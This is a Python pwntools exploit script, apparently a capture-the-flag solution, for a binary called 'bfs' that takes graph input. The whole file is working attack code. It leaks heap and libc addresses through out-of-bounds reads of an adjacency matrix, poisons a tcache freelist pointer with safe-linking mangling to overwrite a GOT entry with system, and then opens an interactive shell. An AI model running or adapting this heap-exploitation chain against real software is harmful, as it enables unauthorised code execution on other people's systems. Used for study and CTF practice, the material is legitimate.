#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=localhost' '--port=1337' ./bfs
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./bfs')
# exe = context.binary = ELF('./bfs_local')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        bfs_pid = int(subprocess.check_output(['pidof', 'bfs']))
        #gdb.attach(io, gdbscript=gdbscript)
        gdb.attach(target=bfs_pid, exe='./bfs', gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x4018FB
b system
continue
'''.format(**locals())
# b *0x40184B


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

testcase_counter = 0
io = start()

q_iters_count = 20+20+8+8+5+8+4
io.writeline(str(q_iters_count).encode())

def play_one(n, edges, bfs_from, bfs_dest):
    """
    moves = [(from1, dest1), ...]
    """
    global testcase_counter

    # send n, k
    io.sendline(b'%d %d' % (n, len(edges)))

    # Set adj_matrix[from_ * MAX_NUMBER_OF_NODES + dest ]++
    # Set adj_matrix[dest  * MAX_NUMBER_OF_NODES + from_]++
    for from_, dest in edges:
        io.sendline(b'%d %d' % (from_, dest))

    # bfs(bfs_from, bfs_dest, n)
    io.sendline(b'%d %d' % (bfs_from, bfs_dest))

    io.recvuntil(b'Testcase #%d: ' % testcase_counter)
    testcase_counter += 1

    # crawl = bfs_dest
    # read std::cout << crawl << " "
    io.recvuntil(b'%u ' % bfs_dest)  # TODO: May appear multiple times?

    data = io.recvuntil(b'\n', drop=True, timeout=1)
    # print("DATA: %r" % data)
    return data

def protect_ptr(pos, ptr):
	return (pos >> 12) ^ ptr

def leak(off):
    parts = []
    for i in range(8):
        p = play_one(2, [
            (0, 1)
        ], 0, off+i)

        p = p.decode()
        if ' ' in p:
            p = p.split(' ')[0]

        parts.append(int(p))
    parts = list(reversed(parts))
    leak = ''.join(map(lambda v: f'{v:02x}', parts))
    return leak

for _ in range(5):
    play_one(256, [(0, i) for i in range(1,256)], 0, 255)

heap_leak = int(leak(0x11130), 16) << 12
heap_base = heap_leak - 0x23000
log.success(f"heap leak: {heap_leak:#x}")
log.success(f"heap base: {heap_base:#x}")

for i in range(20):
    play_one(256, [(i, j) for j in range(1,256)], i, 255)

for i in range(20):
    play_one(256, [], 0, 255)


libc_leak = int(leak(0x11e30), 16)
log.success(f"libc leak: {libc_leak:#x}")
libc_base = libc_leak - 0x219ce0
log.success(f"libc_base: {libc_base:#x}")


victim_chunk = heap_base + 0x23e40
next_chunk_in_tcache = heap_base + 0x23c30
log.info(f"Victim chunk {victim_chunk:#x}")
alarm = 0x407080 # __stack_chk_fail got
target_ptr = protect_ptr(victim_chunk, alarm)
old_ptr = protect_ptr(victim_chunk, next_chunk_in_tcache)
log.info(f"old next ptr should be {old_ptr:#x}")
log.info(f"encrypted alarm target_ptr {target_ptr:#x}")

mask = 0xFF
for i in range(8):
    wanted_value = (target_ptr & mask) >> (i * 8)
    current_value = (old_ptr & mask) >> (i * 8)
    idx256 = 0x11b10 // 256
    rest = 0x11b10 % 256

    increments = wanted_value - current_value
    if increments < 0:
        increments += 0x100

    if current_value == wanted_value:
        idx256 = 0
    else:
        log.info(f"Want value {wanted_value:#x}, but current is {current_value:#x}, so adding {increments:#x}")

    play_one(256, [(idx256, rest+i) for _ in range(increments)], 0, 255)
    mask <<= 8

play_one(256, [(0, j) for j in range(1,256)], 0, 255)
play_one(256, [(1, j) for j in range(1,256)], 1, 255)

play_one(256, [(2, j) for j in range(1,232)], 2, 255)

system = libc_base + 0x50d60
log.info(f"one_gadget {system:#x}")

moves = []
mask = 0xFF
start_node = 4
for i in range(8):
    wanted_value = (system & mask) >> (i * 8)
    if not  wanted_value: continue
    moves.append((start_node, wanted_value))
    start_node = wanted_value
    mask <<= 8


print(moves)
play_one(256, moves, 4, start_node)

# crashes in one gadget

io.interactive()
